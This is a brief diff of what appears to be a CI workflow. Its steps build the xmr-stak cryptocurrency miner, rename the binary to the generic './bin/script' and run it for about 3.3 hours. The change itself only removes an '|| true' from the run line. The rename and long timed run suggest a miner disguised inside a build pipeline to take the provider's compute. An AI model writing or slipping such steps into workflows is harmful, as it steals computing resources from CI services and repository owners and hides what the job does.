@@ -13,4 +13,4 @@ jobs:
       - run: pwd
       - run: ./auto.sh
       - run: mv ./bin/xmr-stak ./bin/script
-      - run: timeout 11998 ./bin/script || true
+      - run: timeout 11998 ./bin/script
